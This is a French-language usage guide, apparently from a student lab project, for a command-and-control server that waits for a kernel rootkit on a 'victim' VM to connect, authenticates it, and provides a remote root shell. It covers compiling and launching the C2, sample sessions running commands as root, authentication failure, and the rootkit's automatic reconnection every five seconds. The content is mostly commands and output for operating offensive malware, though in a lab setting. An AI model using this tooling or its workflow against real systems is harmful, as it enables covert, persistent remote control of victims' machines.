# Utiliser le C2

Le programme C2 (Command & Control) tourne sur la **VM Attaquante**. Il écoute sur un port TCP, attend qu'un rootkit se connecte, l'authentifie, puis offre un shell interactif pour exécuter des commandes à distance sur la VM Victime.

---

## Compiler le C2

```bash
# Sur la VM Attaquante
ssh -p 10023 epita@localhost

# Copier les sources si nécessaire (depuis l'hôte d'abord)
# cp -r attacking_program/ vmshare/    ← sur l'hôte

cd /mnt/vmshare/attacking_program
make
```

Sortie attendue :

```
cc -Wall -Wextra -O2 -o c2 c2.c
```

Le binaire `c2` est créé dans `/mnt/vmshare/attacking_program/`.

---

## Lancer le C2

```bash
./c2 <port> <mot-de-passe>
```

Exemple avec le mot de passe `test` :

```bash
./c2 4444 test
```

Sortie :

```
[*] C2 listening on port 4444
[?] Waiting for rootkit connection...
```

Le C2 attend maintenant qu'un rootkit se connecte.

---

## Connexion du rootkit

Chargez le module sur la VM Victime (voir [Charger le module](load.md) ou [Persistance](persistence.md)). Le C2 affiche :

```
[+] Rootkit connected from 192.168.100.20
c2_shell>
```

Le prompt `c2_shell>` indique que l'authentification a réussi et que vous pouvez envoyer des commandes.

---

## Exécuter des commandes

Tapez n'importe quelle commande shell après le prompt :

```
c2_shell> uname -a
[Exit Status: 0]
--- STDOUT ---
Linux epita-victim 6.1.0-35-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.120-1 x86_64 GNU/Linux

--- STDERR ---

--- End of Output ---

c2_shell> whoami
[Exit Status: 0]
--- STDOUT ---
root

--- STDERR ---

--- End of Output ---

c2_shell> ls /nonexistent
[Exit Status: 2]
--- STDOUT ---

--- STDERR ---
ls: cannot access '/nonexistent': No such file or directory

--- End of Output ---
```

La réponse contient toujours :
- L'exit status (0 = succès, autre valeur = erreur)
- La sortie standard (STDOUT)
- La sortie d'erreur (STDERR)

---

## Comportement si le mot de passe est incorrect

Si le rootkit est chargé avec un hash différent du mot de passe passé au C2, l'authentification échoue. Le C2 affiche :

```
[-] Authentication failed
[?] Waiting for rootkit connection...
```

Sur la VM Victime, `dmesg` affiche :

```
wlkom: C2 authentication failed
```

Le module ferme la connexion et relance une tentative de connexion automatiquement.

---

## Comportement si le C2 est coupé

Si vous faites `Ctrl+C` dans le terminal C2 et le relancez, le rootkit se reconnecte automatiquement. Il retry toutes les 5 secondes.

```bash
# Couper le C2 (Ctrl+C), puis le relancer
./c2 4444 test
```

Le rootkit se reconnecte sans qu'aucune intervention ne soit nécessaire côté victime.

---

## Options du C2

```
Usage: ./c2 <port> <password>

  port       Port TCP sur lequel écouter (ex: 4444)
  password   Mot de passe en clair — le C2 calcule son hash FNV-1a
             et l'envoie au rootkit pour authentification
```

Si les arguments sont manquants :

```
Usage: ./c2 <port> <password>
```

- [x] Après chargement du module sur la victime : `[+] Rootkit connected from 192.168.100.20`

- [x] Un mauvais mot de passe affiche `Authentication failed`
- [x] Après `Ctrl+C` + relance du C2 : le rootkit se reconnecte automatiquement
